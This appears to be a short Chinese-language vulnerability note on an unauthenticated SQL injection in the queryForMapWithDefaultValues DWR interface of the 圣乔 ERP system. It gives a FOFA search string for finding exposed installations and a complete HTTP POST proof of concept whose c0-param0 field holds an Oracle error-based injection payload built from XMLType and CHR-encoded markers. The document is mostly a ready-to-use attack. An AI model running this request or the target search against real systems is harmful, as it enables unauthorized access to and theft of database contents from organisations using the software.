# 圣乔ERP系统queryForMapWithDefaultValues存在SQL注入漏洞

圣乔ERP系统 queryForMapWithDefaultValues接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息

## fofa

```javascript
title="圣乔ERP系统"
```

## poc

```javascript
POST /erp/dwr/call/plaincall/ResultSetConvertor.queryForMapWithDefaultValues.dwr HTTP/1.1
Host: 
Content-Type: text/plain
Priority: u=0
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

callCount=1
page=/erp/dwr/test/ResultSetConvertor
httpSessionId=
scriptSessionId=B4C02555EA992FF3A73F3CCA60389809871
c0-scriptName=ResultSetConvertor
c0-methodName=queryForMapWithDefaultValues
c0-id=0
c0-param0=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(122)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (99=99) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(122)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)
c0-param1=Array:[]
batchId=4
```

